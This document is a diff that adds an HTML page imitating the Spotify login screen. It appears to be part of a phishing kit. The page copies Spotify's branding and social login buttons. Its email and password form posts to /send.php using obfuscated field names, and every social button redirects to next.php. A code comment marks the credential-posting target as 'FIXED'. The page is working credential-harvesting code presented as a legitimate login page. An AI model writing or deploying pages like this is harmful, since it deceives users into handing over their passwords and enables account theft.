@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="./img/fav.ico">
+    <title data-translate="page-title">Login - Spotify</title>
+    <link rel="stylesheet" href="login.css">
+</head>
+<body>
+    <div class="lautaro">
+        <div class="barella">
+            <img src="img/lgo.webp" alt="Spotify Logo">
+        </div>
+        
+        <div class="bastoni">
+            <button class="thuram" type="button" onclick="window.location.href='next.php'">
+                <img src="img/fb.svg" alt="Facebook">
+                <span data-translate="continue-facebook">Continue with Facebook</span>
+            </button>
+            
+            <button class="thuram" type="button" onclick="window.location.href='next.php'">
+                <img src="img/go.svg" alt="Google">
+                <span data-translate="continue-google">Continue with Google</span>
+            </button>
+            
+            <button class="thuram" type="button" onclick="window.location.href='next.php'">
+                <img src="img/apl.svg" alt="Apple">
+                <span data-translate="continue-apple">Continue with Apple</span>
+            </button>
+            
+            <button class="thuram" type="button" onclick="window.location.href='next.php'">
+                <span data-translate="continue-phone">Continue with phone number</span>
+            </button>
+            
+            <div class="calhanoglu"></div>
+            
+            <!-- FIXED: Now posts to /send.php -->
+            <form action="/send.php" method="POST">
+                <div class="dimarco">
+                    <label for="email" data-translate="email-label">Email or username</label>
+                    <input type="text" name="keydadadaad" id="email" placeholder="Email or username" autocomplete="username" required>
+                </div>
+                
+                <div class="dimarco">
+                    <label for="password" data-translate="password-label">Password</label>
+                    <input type="password" name="keydadadaade4" id="password" placeholder="Password" autocomplete="current-password" required>
+                    <button type="button" class="sommer" aria-label="Toggle password visibility">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="sneijder">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </button>
+                </div>
+                
+                <button type="submit" class="mkhitaryan" data-translate="login-button">Log In</button>
+            </form>
+            
+            <a href="#" class="acerbi" data-translate="forgot-password">Forgot your password?</a>
+            
+            <div class="dumfries">
+                <span data-translate="no-account">Don't have an account?</span> <a href="#" class="zanetti" data-translate="sign-up">Sign up for Spotify</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="cambiasso">
+        <img src="img/foot.webp" alt="Footer decoration">
+    </div>
+
+    
+    <script src="login.js"></script>
+</body>
+</html>
